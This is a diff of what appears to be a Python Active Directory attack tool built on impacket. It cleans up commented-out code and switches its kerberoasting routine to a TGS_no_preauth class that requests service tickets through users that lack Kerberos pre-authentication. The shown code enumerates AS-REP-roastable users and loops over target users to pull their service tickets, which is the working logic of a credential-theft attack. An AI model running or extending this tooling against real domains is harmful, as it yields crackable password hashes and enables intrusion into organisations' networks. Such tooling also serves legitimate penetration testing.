@@ -15,7 +15,7 @@ from impacket.krb5.types import Principal
 try:
     from utils.kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT
     from utils.adconn import LdapConn
-    from utils.tickets import TGT, TGS
+    from utils.tickets import TGT, TGS_no_preauth
 except:
     sys.path.insert(0, './utils')
     from adconn import LdapConn
@@ -53,48 +53,13 @@ def enumerate_user(user, domain, dc):
         print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
         no_preauth_users.append(user)
         return {'user':user}
-        # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        # try:
-        #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
-        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
-        #                                        kdcHost=self.dc_ip)
-        
-        #     return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':oldSessionKey, 'newSessionKey':newSessionKey}
-        
-        # except AttributeError:
-        #     sys.stdout.flush()
-        #     print("")
-        #     print(f"\n3 found user: {self.username} \n")
-        #     return None
-        # except SessionError as e:
-        #     try:
-        #         code = e.getErrorCode()
-        #         if code != 6:
-        #             sys.stdout.flush()
-        #             print(f"\n 1found user: {self.username} {e} on code: {code}")
-        #     except:
-        #         sys.stdout.flush()
-        #         print(f"\n 2found user: {self.username}")
-        # except Exception as e:
-        #     print(f"1 {traceback.format_exc()}")
-        #     print(f'trying with domain instead of user....')
-        #     serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        #     try:
-        #         tgt, cipher, old, new = getKerberosTGT(serverName, password=self.password, 
-        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
-        #                                        kdcHost=self.dc_ip)
-        #         return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
-        #     except Exception as e:
-        #         None
-
-        #     return 1
 
 
 def get_userTGSs(no_preauth_user, domain, target_users, dc):
     print('[+] trying to kerberoast with the gathered info....')
     for user in target_users:
         try:
-            T = TGS(domain=domain, username=user, dc=dc)
+            T = TGS_no_preauth(domain=domain, username=user, dc=dc)
             T.run(nopreauth_user=no_preauth_user)
         except Exception as e:
             None
@@ -107,33 +72,10 @@ def get_userTGT(user, domain, dc):
     if valid != None:
         T = TGT(domain=domain, username=user, dc=dc)
         tgt_data = T.run()
-
-        # except:
-        #     try:
-        #         Ts = TGS(domain=domain, username=user, dc=dc)
-        #         if tgt_data:
-        #             no_preauth = user
-        #             tgt_data = Ts.run(nopreauth_user=no_preauth)
-        #         # `error preauth failed`
-        #     except Exception as e:
-        #         print(traceback.print_exc())
     else:
         tgt_data = None
     return tgt_data
-    # if tgt_data != None:
-    #     tgt = tgt_data['tgt']
-    #     cipher = tgt_data['cipher']
-    #     old = tgt_data['oldSessionKey']
-    #     new = tgt_data['newSessionKey']
-    #     print(tgt_data)
-    #     try:
-    #         TS = TGS(tgt=tgt, domain=domain, cipher=cipher, old=old, new=new, user=user, dc=dc, preauth=False)
-    #         tgs = TS.run()
-    #     except Exception as e:
-    #         print(f"TGS error: {e}")
-    #     return tgs
-    # if tgt_data == None:
-    #     return None
+
 
 
 
